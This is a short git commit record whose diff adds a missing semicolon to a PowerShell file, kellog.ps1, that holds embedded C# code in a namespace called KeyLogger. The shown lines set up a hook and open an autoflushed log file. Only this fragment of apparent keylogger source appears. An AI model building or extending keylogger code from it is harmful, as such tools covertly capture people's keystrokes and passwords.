8eee22cbdb1b979030acbac6bfa71e17f678761f
[R3dact3d] <emmettwb@gmail.com>
2019-01-16 11:55:56 -0700

    Update kellog.ps1

--- kellog.ps1
+++ kellog.ps1
@@ -18,7 +18,7 @@ namespace KeyLogger {
     private static IntPtr hookId = IntPtr.Zero;
 
     public static void Main(string[] args) {
-      logFileName = args[0]
+      logFileName = args[0];
       logFile = File.AppendText(logFileName);
       logFile.AutoFlush = true;
 
